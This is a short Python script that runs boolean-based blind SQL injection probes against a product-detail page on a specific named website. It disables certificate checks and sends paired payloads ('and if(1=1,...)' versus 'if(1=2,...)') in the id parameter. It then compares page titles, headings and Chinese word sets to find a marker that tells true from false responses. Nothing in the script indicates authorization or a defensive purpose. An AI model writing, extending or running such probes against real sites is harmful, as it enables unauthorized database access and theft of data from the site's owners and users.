#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, re
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='

def get(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
        return r.read(100000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        return e.read(100000).decode('utf-8','ignore')
    except Exception:
        return ''

# 真: id=687详情, 假: id=0
t = get("687' and if(1=1,687,0)#")
f = get("687' and if(1=2,687,0)#")

# 找真页面特有的内容(产品标题/名称)
print('=== 真页面特征 ===')
for pat in [r'<title>([^<]*)</title>', r'产品[^<]{0,50}', r'<h[12][^>]*>([^<]+)</h', r'name[^>]*>[^<]{3,50}']:
    m = re.findall(pat, t)
    if m:
        print(pat, '->', m[:3])

print('=== 假页面特征 ===')
for pat in [r'<title>([^<]*)</title>', r'产品[^<]{0,50}', r'没有|未找到|不存在|无']:
    m = re.findall(pat, f)
    if m:
        print(pat, '->', m[:3])

# 对比: 真页面有但假页面没有的关键词
t_words = set(re.findall(r'[\u4e00-\u9fff]{2,8}', t))
f_words = set(re.findall(r'[\u4e00-\u9fff]{2,8}', f))
diff = t_words - f_words
print('=== 真页面独有词(前30) ===')
print(list(diff)[:30])

print('=== 假页面独有词(前20) ===')
print(list(f_words - t_words)[:20])
